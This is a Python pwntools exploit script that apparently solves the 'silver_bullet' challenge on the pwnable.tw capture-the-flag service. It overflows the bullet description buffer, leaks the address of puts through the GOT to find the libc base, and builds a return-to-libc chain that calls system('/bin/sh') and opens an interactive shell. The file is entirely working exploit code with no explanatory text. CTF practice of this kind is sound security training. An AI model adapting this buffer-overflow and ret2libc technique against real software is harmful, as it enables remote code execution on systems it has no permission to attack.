from pwn import *

io = remote('chall.pwnable.tw', 10103)
elf = ELF('./silver_bullet')
libc = ELF('./libc_32.so.6')

def create_bullet(desc):
    io.recvuntil('Your choice :')
    io.sendline('1')
    io.recvuntil('Give me your description of bullet :')
    io.send(desc)

def power_up(new_desc):
    io.recvuntil('Your choice :')
    io.sendline('2')
    io.recvuntil('Give me your another description of bullet :')
    io.send(new_desc)

def beat():
    io.recvuntil('Your choice :')
    io.sendline('3')

# overwrite bullet->power with 0
create_bullet('A' * 47)
power_up('A')

# print address of puts and calculate base address of libc
main_address = 0x8048954
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
power_up(b'\x7f\xff\xff' + b'AAAA' + p32(puts_plt) + p32(main_address) + p32(puts_got))
beat()
io.recvuntil('Oh ! You win !!\n')
puts_addr = u32(io.recv(4))
libc.address = puts_addr - libc.sym['puts']

# again
create_bullet('A' * 47)
power_up('B')

# trigger system('/bin/sh')
system_addr = libc.sym['system']
sh_addr = next(libc.search(b'/bin/sh'))
power_up(b'\x7f\xff\xff' + b'AAAA' + p32(system_addr) + b'AAAA' + p32(sh_addr))
beat()

io.interactive()
